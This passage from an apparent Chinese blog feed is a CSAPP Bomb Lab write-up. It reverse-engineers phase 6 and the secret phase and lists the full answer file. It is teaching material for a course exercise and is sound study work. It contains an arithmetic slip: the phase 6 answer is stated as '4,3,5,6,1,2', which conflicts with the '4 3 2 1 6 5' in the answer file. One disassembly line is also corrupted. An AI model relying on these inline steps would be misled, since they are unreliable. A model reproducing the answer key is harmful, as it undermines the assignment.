<td>57</td>
<td>W</td>
</tr>
</tbody></table>
<h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p><code>phase_6</code>的代码如下，非常的长</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:   41 56                   push   %r14</span><br><span class="line">  4010f6:   41 55                   push   %r13</span><br><span class="line">  4010f8:   41 54                   push   %r12</span><br><span class="line">  4010fa:   55                      push   %rbp</span><br><span class="line">  4010fb:   53                      push   %rbx</span><br><span class="line">  4010fc:   48 83 ec 50             sub    $0x50,%rsp</span><br><span class="line">  401100:   49 89 e5                mov    %rsp,%r13</span><br><span class="line">  401103:   48 89 e6                mov    %rsp,%rsi</span><br><span class="line">  401106:   e8 51 03 00 00          callq  40145c &lt;read_six_numbers&gt; #读6个数，保存到$rsp</span><br><span class="line"># 步骤1：判断输入的每个数是否不超过6，且任意两个数都不相等</span><br><span class="line">  40110b:   49 89 e6                mov    %rsp,%r14</span><br><span class="line">  40110e:   41 bc 00 00 00 00       mov    $0x0,%r12d			# %r12d = 0</span><br><span class="line">  401114:   4c 89 ed                mov    %r13,%rbp			# 初始$rbp, %r13都指向第一个数</span><br><span class="line">  401117:   41 8b 45 00             mov    0x0(%r13),%eax</span><br><span class="line">  40111b:   83 e8 01                sub    $0x1,%eax</span><br><span class="line">  40111e:   83 f8 05                cmp    $0x5,%eax			# 每个数必须小于等于6，否则爆炸</span><br><span class="line">  401121:   76 05                   jbe    401128 &lt;phase_6+0x34&gt;</span><br><span class="line">  401123:   e8 12 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401128:   41 83 c4 01             add    $0x1,%r12d			# %12d循环计数，每次加1</span><br><span class="line">  40112c:   41 83 fc 06             cmp    $0x6,%r12d			# 第一重循环，终止条件是%r12d等于6</span><br><span class="line">  401130:   74 21                   je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line">  401132:   44 89 e3                mov    %r12d,%ebx			# %ebx &lt;- %r12d</span><br><span class="line">  401135:   48 63 c3                movslq %ebx,%rax</span><br><span class="line">  401138:   8b 04 84                mov    (%rsp,%rax,4),%eax	# 将输入的下一个整数保存到%eax</span><br><span class="line">  40113b:   39 45 00                cmp    %eax,0x0(%rbp)		# 第二重循环，当前整数不能和它后面的任意一个数重复，否则爆炸； 两重循环用于确保输入的6个数没有重复数字，否则引爆炸弹</span><br><span class="line">  40113e:   75 05                   jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line">  401140:   e8 f5 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401145:   83 c3 01                add    $0x1,%ebx</span><br><span class="line">  401148:   83 fb 05                cmp    $0x5,%ebx</span><br><span class="line">  40114b:   7e e8                   jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">  40114d:   49 83 c5 04             add    $0x4,%r13</span><br><span class="line">  401151:   eb c1                   jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line"># 步骤2：对于每个输入的整数，做这样的转换：用7减去这个整数的值替换原来的数</span><br><span class="line">  401153:   48 8d 74 24 18          lea    0x18(%rsp),%rsi</span><br><span class="line">  401158:   4c 89 f0                mov    %r14,%rax</span><br><span class="line">  40115b:   b9 07 00 00 00          mov    $0x7,%ecx 			# %ecx初值为7</span><br><span class="line">  401160:   89 ca                   mov    %ecx,%edx</span><br><span class="line">  401162:   2b 10                   sub    (%rax),%edx 			# %edx = 7 - (%rax), %rax指向当前整数</span><br><span class="line">  401164:   89 10                   mov    %edx,(%rax) 			# (%rax) = %edx</span><br><span class="line">  401166:   48 83 c0 04             add    $0x4,%rax   			# 循环每执行一次, %rax指向下一个整数</span><br><span class="line">  40116a:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line">  40116d:   75 f1                   jne    401160 &lt;phase_6+0x6c&gt;</span><br><span class="line"># 步骤3：0x6032d0处表示一个包含6个节点的链表， 对于经过步骤2之后转换的每个整数i, 取链表第i个节点的value，依次保存在(%rsp + 32)处</span><br><span class="line">  40116f:   be 00 00 00 00          mov    $0x0,%esi   # esi设为0</span><br><span class="line">  401174:   eb 21                   jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line">  401176:   48 8b 52 08             mov    0x8(%rdx),%rdx		# 访问链表</span><br><span class="line">  40117a:   83 c0 01                add    $0x1,%eax</span><br><span class="line">  40117d:   39 c8                   cmp    %ecx,%eax</span><br><span class="line">  40117f:   75 f5                   jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">  401181:   eb 05                   jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line">  401183:   ba d0 32 60 00          mov    $0x6032d0,%edx 		# 0x6032d0处为链表，包含6个节点</span><br><span class="line">  401188:   48 89 54 74 20          mov    %rdx,0x20(%rsp,%rsi,2) #每次取链表中第%ecx个节点的值，保存到$rsp + 0x20 + 2 * $rsi处， %ecx表示每个</span><br><span class="line">  40118d:   48 83 c6 04             add    $0x4,%rsi</span><br><span class="line">  401191:   48 83 fe 18             cmp    $0x18,%rsi</span><br><span class="line">  401195:   74 14                   je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line">  401197:   8b 0c 34                mov    (%rsp,%rsi,1),%ecx	# ecx初始值为%rsp, 指向第一个数</span><br><span class="line">  40119a:   83 f9 01                cmp    $0x1,%ecx</span><br><span class="line">  40119d:   7e e4                   jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line">  40119f:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  4011a4:   ba d0 32 60 00          mov    $0x6032d0,%edx		# 0x6032d0处为链表，包含6个节点</span><br><span class="line">  4011a9:   eb cb                   jmp    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">  4011ab:   48 8b 5c 24 20          mov    0x20(%rsp),%rbx 		# 保存6个节点的值</span><br><span class="line">  4011b0:   48 8d 44 24 28          lea    0x28(%rsp),%rax</span><br><span class="line">  4011b5:   48 8d 74 24 50          lea    0x50(%rsp),%rsi</span><br><span class="line">  4011ba:   48 89 d9                mov    %rbx,%rcx</span><br><span class="line">  4011bd:   48 8b 10                mov    (%rax),%rdx</span><br><span class="line">  4011c0:   48 89 51 08             mov    %rdx,0x8(%rcx)</span><br><span class="line">  4011c4:   48 83 c0 08             add    $0x8,%rax</span><br><span class="line">  4011c8:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line">  4011cb:   74 05                   je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line">  4011cd:   48 89 d1                mov    %rdx,%rcx</span><br><span class="line">  4011d0:   eb eb                   jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line"># 4.判断（%rsp + 32）处的6个整数是否为降序排列，如不满足条件引爆炸弹</span><br><span class="line">  4011d2:   48 c7 42 08 00 00 00    movq   $0x0,0x8(%rdx)</span><br><span class="line">  4011d9:   00</span><br><span class="line">  4011da:   bd 05 00 00 00          mov    $0x5,%ebp</span><br><span class="line">  4011df:   48 8b 43 08             mov    0x8(%rbx),%rax		#将链表下一个节点地址给rax</span><br><span class="line">  4011e3:   8b 00                   mov    (%rax),%eax			#eax为链表下一个节点的值</span><br><span class="line">  4011e5:   39 03                   cmp    %eax,(%rbx)			# 比较前后两个节点的值</span><br><span class="line">  4011e7:   7d 05                   jge    4011ee &lt;phase_6+0xfa&gt;#前一个数要大于后一个，否则炸弹爆炸。即必须为降序排列</span><br><span class="line">  4011e9:   e8 4c 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4011ee:   48 8b 5b 08             mov    0x8(%rbx),%rbx</span><br><span class="line">  4011f2:   83 ed 01                sub    $0x1,%ebp</span><br><span class="line">  4011f5:   75 e8                   jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line">  4011f7:   48 83 c4 50             add    $0x50,%rsp</span><br><span class="line">  4011fb:   5b                      pop    %rbx</span><br><span class="line">  4011fc:   5d                      pop    %rbp</span><br><span class="line">  4011fd:   41 5c                   pop    %r12</span><br><span class="line">  4011ff:   41 5d                   pop    %r13</span><br><span class="line">  401201:   41 5e                   pop    %r14</span><br><span class="line">  401203:   c3                      retq</span><br></pre></td></tr></table></figure>

<p><code>40111b ~ 40111e</code>： 将每个输入的整数和6比较，如存在某个数大于6，引爆炸弹。</p>
<p><code>40110b ~ 401153</code>： 双重循环，用于判断输入的6个数字中是否存在两个数相同。如果存在，引爆炸弹。</p>
<p>举例：用户可以输入<code>1,2,3,4,5,6</code>，记为<strong>序列0</strong>，满足以上两个条件。</p>
<p><code>401160 ~ 40116d</code>： 一重循环，对于<strong>序列0</strong>中的每个整数，做这样的转换：用<code>7</code>减去这个整数的结果替换原来的数，即得到<strong>序列1</strong>： <code>6,5,4,3,2,1</code>。</p>
<p>注意到<code>%edx</code>初值为<code>0x6032d0</code>， 打印这块内存，发现这是一条链表, 包含6个节点。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/24x 0x6032d0</span><br><span class="line">0x6032d0 &lt;node1&gt;:       0x0000014c      0x00000001      0x006032e0      0x00000000</span><br><span class="line">0x6032e0 &lt;node2&gt;:       0x000000a8      0x00000002      0x006032f0      0x00000000</span><br><span class="line">0x6032f0 &lt;node3&gt;:       0x0000039c      0x00000003      0x00603300      0x00000000</span><br><span class="line">0x603300 &lt;node4&gt;:       0x000002b3      0x00000004      0x00603310      0x00000000</span><br><span class="line">0x603310 &lt;node5&gt;:       0x000001dd      0x00000005      0x00603320      0x00000000</span><br><span class="line">0x603320 &lt;node6&gt;:       0x000001bb      0x00000006      0x00000000      0x00000000</span><br></pre></td></tr></table></figure>

<p><code>40116f ~ 4011d0</code>：遍历转换后的<strong>序列1</strong>，对于每个整数<code>i</code>, 取第<code>i</code>个<code>node</code>节点的值，依次存储到<code>%rsp + 32</code>处，本例中存储到<code>%rsp + 32</code>的6个数为<code>0x1bb</code>,<code>0x1dd</code>,<code>0x2b3</code>, <code>0x39c</code>, <code>0xa8</code>, <code>0x14c</code>,  记为<strong>序列2</strong>。</p>
<p><code>4011d2 ~ 4011f5</code>：判断<strong>序列2</strong>是否为降序排列，本例中的<strong>序列2</strong>不满足条件。因此我们需要回过头，调整输入的6个整数的顺序，使得序列2为降序排列，过程如下：</p>
<ul>
<li><p>链表中6个节点降序排列应为： <code>0x39c</code>,<code>0x2b3</code>,<code>0x1dd</code>,<code>0x1bb</code>,<code>0x14c</code>, <code>0xa8</code></p>
</li>
<li><p>对应的6个节点序列为：<code>node3</code>,<code>node4</code>,<code>node5</code>,<code>node6</code>,<code>node1</code>,<code>node2</code></p>
</li>
<li><p>推导出序列1: <code>3,4,5,6,1,2</code></p>
</li>
<li><p>根据序列1逆推出输入：<code>7-3, 7-4, 7-5, 7-6, 7-1, 7-2</code> -&gt; <code>4, 3, 5, 6, 1, 2</code></p>
</li>
</ul>
<p>最终得到这一关的答案为<code>4,3,5,6,1,2</code>， 唯一解。</p>
<h3 id="隐藏关"><a href="#隐藏关" class="headerlink" title="隐藏关"></a>隐藏关</h3><p>在汇编文件中搜<code>secret_phase</code>，发现<code>phase_defused</code>调用了它。先看看如何触发隐藏关，<code>phase_defused</code>代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004015c4 &lt;phase_defused&gt;:</span><br><span class="line">  4015c4:   48 83 ec 78             sub    $0x78,%rsp</span><br><span class="line">  4015c8:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line">  4015cf:   00 00</span><br><span class="line">  4015d1:   48 89 44 24 68          mov    %rax,0x68(%rsp)</span><br><span class="line">  4015d6:   31 c0                   xor    %eax,%eax</span><br><span class="line">  4015d8:   83 3d 81 21 20 00 06    cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;	仅当第6关通过后，不进行跳转，进入隐藏关</span><br><span class="line">  4015df:   75 5e                   jne    40163f &lt;phase_defused+0x7b&gt;</span><br><span class="line">  4015e1:   4c 8d 44 24 10          lea    0x10(%rsp),%r8</span><br><span class="line">  4015e6:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx</span><br><span class="line">  4015eb:   48 8d 54 24 08          lea    0x8(%rsp),%rdx</span><br><span class="line">  4015f0:   be 19 26 40 00          mov    $0x402619,%esi	# 格式为&quot;%d %d %s&quot;</span><br><span class="line">  4015f5:   bf 70 38 60 00          mov    $0x603870,%edi	# 0x603870处保存第四关输入的答案， 可通过对phase_defused打断点，或者对0x603870打数据断点确认</span><br><span class="line">  4015fa:   e8 f1 f5 ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  4015ff:   83 f8 03                cmp    $0x3,%eax					# 需要输入3个参数，才能触发隐藏关，否则跳转0x401635</span><br><span class="line">  401602:   75 31                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401604:   be 22 26 40 00          mov    $0x402622,%esi	# %esi处字符串&quot;DrEvil&quot;</span><br><span class="line">  401609:   48 8d 7c 24 10          lea    0xls</span><br><span class="line">  40160e:   e8 25 fd ff ff          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  401613:   85 c0                   test   %eax,%eax</span><br><span class="line">  401615:   75 1e                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401617:   bf f8 24 40 00          mov    $0x4024f8,%edi</span><br><span class="line">  40161c:   e8 ef f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401621:   bf 20 25 40 00          mov    $0x402520,%edi</span><br><span class="line">  401626:   e8 e5 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40162b:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401630:   e8 0d fc ff ff          callq  401242 &lt;secret_phase&gt;</span><br><span class="line">  401635:   bf 58 25 40 00          mov    $0x402558,%edi</span><br><span class="line">  40163a:   e8 d1 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40163f:   48 8b 44 24 68          mov    0x68(%rsp),%rax</span><br><span class="line">  401644:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line">  40164b:   00 00</span><br><span class="line">  40164d:   74 05                   je     401654 &lt;phase_defused+0x90&gt;</span><br><span class="line">  40164f:   e8 dc f4 ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  401654:   48 83 c4 78             add    $0x78,%rsp</span><br><span class="line">  401658:   c3                      retq</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先查看<code>4015ff: cmp $0x3,%eax</code>， 说明<code>sscanf</code>需接受3个变参才能触发隐藏关。参数格式依次为<code>%d, %d, %s</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x402619</span><br><span class="line">0x402619:       &quot;%d %d %s&quot;</span><br></pre></td></tr></table></figure>

<p>接下来确定<code>0x603870</code>处字符串怎么来的。在<code>0x603870</code>处设置gdb数据断点, 发现<code>0x603870</code>处内容依次变为<code>7</code>, <code>7 0</code>，然后程序退出。而<code>7 0</code>恰好是我们第四关输入的答案。 说明我们只需在第四关后添加一个合适的字符串，作为第3个参数，即可触发隐藏关。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) watch *0x603870							# 设置内存断点</span><br><span class="line">Hardware watchpoint 5: *0x603870</span><br><span class="line">(gdb) r</span><br><span class="line">...</span><br><span class="line">Hardware watchpoint 5: *0x603870</span><br><span class="line">Old value = 0</span><br><span class="line">New value = 55</span><br><span class="line">0x00007ffff7aa1b53 in __memcpy_sse2 () from /lib64/libc.so.6</span><br><span class="line">(gdb) x/s 0x603870</span><br><span class="line">0x603870 &lt;input_strings+240&gt;:   &quot;7&quot;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Hardware watchpoint 5: *0x603870</span><br><span class="line">Old value = 55</span><br><span class="line">New value = 3153975</span><br><span class="line">0x00007ffff7aa1b64 in __memcpy_sse2 () from /lib64/libc.so.6</span><br><span class="line">(gdb) x/s 0x603870</span><br><span class="line">0x603870 &lt;input_strings+240&gt;:   &quot;7 0&quot;</span><br></pre></td></tr></table></figure>

<p>根据<code>401604: mov $0x402622,%esi</code>， 确认输入的字符串为<code>&quot;DrEvil&quot;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x402622</span><br><span class="line">0x402622:       &quot;DrEvil&quot;</span><br></pre></td></tr></table></figure>

<p>因此，只需要将第四关答案改为<code>7 0 DrEvil</code>， 即可触发隐藏关。</p>
<h4 id="查看隐藏关代码"><a href="#查看隐藏关代码" class="headerlink" title="查看隐藏关代码"></a>查看隐藏关代码</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">0000000000401242 &lt;secret_phase&gt;:</span><br><span class="line">  401242:   53                      push   %rbx</span><br><span class="line">  401243:   e8 56 02 00 00          callq  40149e &lt;read_line&gt;</span><br><span class="line">  401248:   ba 0a 00 00 00          mov    $0xa,%edx		# strtol的第三个参数，base等于10</span><br><span class="line">  40124d:   be 00 00 00 00          mov    $0x0,%esi		# strtol的第二个参数, endptr=&#x27;\0&#x27;</span><br><span class="line">  401252:   48 89 c7                mov    %rax,%rdi		# strtol的第一个参数，str=用户输入字符串</span><br><span class="line">  401255:   e8 76 f9 ff ff          callq  400bd0 &lt;strtol@plt&gt;</span><br><span class="line">  40125a:   48 89 c3                mov    %rax,%rbx		# 将用户输入的整数保存到%rbx</span><br><span class="line">  40125d:   8d 40 ff                lea    -0x1(%rax),%eax 	# %eax = %rax - 1</span><br><span class="line">  401260:   3d e8 03 00 00          cmp    $0x3e8,%eax		# 0x3e8 = 1000</span><br><span class="line">  401265:   76 05                   jbe    40126c &lt;secret_phase+0x2a&gt;</span><br><span class="line">  401267:   e8 ce 01 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40126c:   89 de                   mov    %ebx,%esi	 	# fun7的第二个参数, %rbx</span><br><span class="line">  40126e:   bf f0 30 60 00          mov    $0x6030f0,%edi	# fun7</span><br><span class="line">  401273:   e8 8c ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  401278:   83 f8 02                cmp    $0x2,%eax		# fun7的返回值必须为2，否则引爆</span><br><span class="line">  40127b:   74 05                   je     401282 &lt;secret_phase+0x40&gt;</span><br><span class="line">  40127d:   e8 b8 01 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401282:   bf 38 24 40 00          mov    $0x402438,%edi</span><br><span class="line">  401287:   e8 84 f8 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40128c:   e8 33 03 00 00          callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  401291:   5b                      pop    %rbx</span><br></pre></td></tr></table></figure>

<p><code>0x401255</code>处调用了strtol函数，函数声明如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">int</span> <span class="title function_">strtol</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">char</span> **endptr, <span class="type">int</span> base)</span>;</span><br></pre></td></tr></table></figure>

<p>查看<code>0x401248 ~ 0x401267</code>，发现最后一关需要输入一个整数，并且该整数不能超过1001。</p>
<p>查看<code>0x40126c ~ 0x40127b</code>， 发现调用了<code>fun7</code>函数，且该函数返回值必须为2。<code>fun7</code>接受两个入参。</p>
<p>打印<code>fun7</code>的第一个参数, 发现这是一棵二叉树。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/120x 0x6030f0</span><br><span class="line">0x6030f0 &lt;n1&gt;:  0x00000024      0x00000000      0x00603110      0x00000000</span><br><span class="line">0x603100 &lt;n1+16&gt;:       0x00603130      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603110 &lt;n21&gt;: 0x00000008      0x00000000      0x00603190      0x00000000</span><br><span class="line">0x603120 &lt;n21+16&gt;:      0x00603150      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603130 &lt;n22&gt;: 0x00000032      0x00000000      0x00603170      0x00000000</span><br><span class="line">0x603140 &lt;n22+16&gt;:      0x006031b0      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603150 &lt;n32&gt;: 0x00000016      0x00000000      0x00603270      0x00000000</span><br><span class="line">0x603160 &lt;n32+16&gt;:      0x00603230      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603170 &lt;n33&gt;: 0x0000002d      0x00000000      0x006031d0      0x00000000</span><br><span class="line">0x603180 &lt;n33+16&gt;:      0x00603290      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603190 &lt;n31&gt;: 0x00000006      0x00000000      0x006031f0      0x00000000</span><br><span class="line">0x6031a0 &lt;n31+16&gt;:      0x00603250      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6031b0 &lt;n34&gt;: 0x0000006b      0x00000000      0x00603210      0x00000000</span><br><span class="line">0x6031c0 &lt;n34+16&gt;:      0x006032b0      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6031d0 &lt;n45&gt;: 0x00000028      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6031e0 &lt;n45+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6031f0 &lt;n41&gt;: 0x00000001      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603200 &lt;n41+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603210 &lt;n47&gt;: 0x00000063      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603220 &lt;n47+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603230 &lt;n44&gt;: 0x00000023      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603240 &lt;n44+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603250 &lt;n42&gt;: 0x00000007      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603260 &lt;n42+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603270 &lt;n43&gt;: 0x00000014      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603280 &lt;n43+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603290 &lt;n46&gt;: 0x0000002f      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6032a0 &lt;n46+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6032b0 &lt;n48&gt;: 0x000003e9      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6032c0 &lt;n48+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br></pre></td></tr></table></figure>

<p>把这棵二叉树画出来, 发现有4层，共15个节点：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">                                        0x24</span><br><span class="line">                              /                       \</span><br><span class="line">                 0x8                                            0x32</span><br><span class="line">            /           \                                   /           \</span><br><span class="line">      0x6                   0x16                    0x2d                    0x6b</span><br><span class="line">    /    \                 /     \                 /     \                 /     \</span><br><span class="line">0x1        0x7        0x14        0x23        0x28        0x2f        0x63        0x3e9</span><br></pre></td></tr></table></figure>

<p><code>fun7</code>代码如下，可以看出这是个递归函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401204 &lt;fun7&gt;:</span><br><span class="line">  401204:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  401208:   48 85 ff                test   %rdi,%rdi</span><br><span class="line">  40120b:   74 2b                   je     401238 &lt;fun7+0x34&gt;</span><br><span class="line">  40120d:   8b 17                   mov    (%rdi),%edx		# 首次调用fun7时， rdi指向二叉树的根节点</span><br><span class="line">  40120f:   39 f2                   cmp    %esi,%edx		# 如当前节点值小于等于用户输入的数，跳转到0x401220</span><br><span class="line">  401211:   7e 0d                   jle    401220 &lt;fun7+0x1c&gt;</span><br><span class="line">  401213:   48 8b 7f 08             mov    0x8(%rdi),%rdi	# 取当前节点的左子女</span><br><span class="line">  401217:   e8 e8 ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  40121c:   01 c0                   add    %eax,%eax</span><br><span class="line">  40121e:   eb 1d                   jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401220:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401225:   39 f2                   cmp    %esi,%edx</span><br><span class="line">  401227:   74 14                   je     40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401229:   48 8b 7f 10             mov    0x10(%rdi),%rdi	# 取当前节点的右子女</span><br><span class="line">  40122d:   e8 d2 ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  401232:   8d 44 00 01             lea    0x1(%rax,%rax,1),%eax # %eax = 2 * $rax + 1</span><br><span class="line">  401236:   eb 05                   jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401238:   b8 ff ff ff ff          mov    $0xffffffff,%eax	# 当前节点为NULL，返回-1</span><br><span class="line">  40123d:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  401241:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>将递归逻辑转换为C语言， 如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 二叉树的数组表示，树高4层, 共15个节点</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> arrTree[] = &#123; <span class="number">0x24</span>,</span><br><span class="line">                        <span class="number">0x8</span>, <span class="number">0x32</span>,</span><br><span class="line">                        <span class="number">0x6</span>, <span class="number">0x16</span>, <span class="number">0x2d</span>, <span class="number">0x6b</span>,</span><br><span class="line">                        <span class="number">0x1</span>, <span class="number">0x7</span> , <span class="number">0x14</span>, <span class="number">0x23</span>, <span class="number">0x28</span>, <span class="number">0x2f</span>, <span class="number">0x63</span>, <span class="number">0x3e9</span> &#125;;</span><br><span class="line"><span class="comment">// idx表示数组arrTree索引，userInput即用户输入的答案</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fun7</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> userInput)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt; <span class="number">14</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// 如当前节点为NULL, 返回-1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(arrTree[idx] &lt; userInput) &#123;</span><br><span class="line">        ret = <span class="number">2</span> * fun7(<span class="number">2</span> * idx + <span class="number">2</span>, userInput) + <span class="number">1</span>; <span class="comment">// 取当前节点的右子女</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(arrTree[idx] &gt; userInput) &#123;</span><br><span class="line">        ret = <span class="number">2</span> * fun7(<span class="number">2</span> * idx + <span class="number">1</span>, userInput); 	<span class="comment">// 取当前节点的左子女</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1002</span>; ++i)</span><br><span class="line">        <span class="keyword">if</span>(fun7(<span class="number">0</span>, i) == <span class="number">2</span>) <span class="comment">// idx初值为0, 表示从二叉树的根开始递归</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;answer: %d\n&quot;</span>, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行C程序，打印如下，说明答案有两组, 输入<code>20</code>或<code>22</code>都可以。</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">answer: 20</span><br><span class="line">answer: 22</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>所有关卡的答案保存在<code>answer</code>文件中，内容如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># cat answer</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">6 682</span><br><span class="line">7 0 DrEvil</span><br><span class="line">IONUVW</span><br><span class="line">4 3 2 1 6 5</span><br><span class="line">20</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># ./bomb answer</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">That&#x27;s number 2.  Keep going!</span><br><span class="line">Halfway there!</span><br><span class="line">So you got that one.  Try this one.</span><br><span class="line">Good work!  On to the next...</span><br><span class="line">Curses, you&#x27;ve found the secret phase!</span><br><span class="line">But finding it and solving it are quite different...</span><br><span class="line">Wow! You&#x27;ve defused the secret stage!</span><br><span class="line">Congratulations! You&#x27;ve defused the bomb!</span><br></pre></td></tr></table></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《深入理解计算机系统 原书第3版》</p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>Assembly</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>源码编译并安装CMake</title>
    <url>/2020/07/26/2020-07-26-how-to-compile-and-install-cmake/</url>
    <content><![CDATA[<p>从官网安装指定版本， 以<code>3.12.1</code>版本为例：</p>
